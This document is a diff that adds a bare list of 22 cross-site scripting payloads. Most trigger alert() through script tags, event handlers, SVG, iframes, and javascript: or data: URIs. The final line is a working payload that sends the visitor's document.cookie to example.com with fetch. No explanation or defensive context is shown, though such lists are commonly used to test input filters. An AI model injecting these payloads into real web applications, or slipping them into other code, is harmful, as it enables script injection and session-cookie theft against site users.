@@ -1,0 +1,22 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<iframe src="javascript:alert('XSS')"></iframe>
+<a href="javascript:alert('XSS')">Click me</a>
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<svg><script>alert(1)</script></svg>
+<marquee behavior="alternate"><script>alert('XSS')</script></marquee>
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+<svg/onload=alert('XSS')>
+<input type="text" value="XSS" onfocus="alert(1)">
+<video><source src="invalid.mp4" onerror="alert('XSS')"></video>
+<form action="javascript:alert('XSS')"><button>Submit</button></form>
+<style>@import 'javascript:alert(1)';</style>
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(2)</script></svg>
+<embed src="data:image/svg+xml,<svg><script>alert(3)</script></svg>">
+<source onerror="alert('XSS')" src="invalid.mp4">
+<details open ontoggle="alert('XSS')"><summary>Toggle</summary></details>
+<svg><image href="x" onerror="alert(4)"/></svg>
+<a href="http://example.com" onmouseover="alert('XSS')">Hover over me</a>
+<iframe src="http://example.com" onload="alert('XSS')"></iframe>
+<script>fetch('http://example.com/?cookie=' + document.cookie);</script>
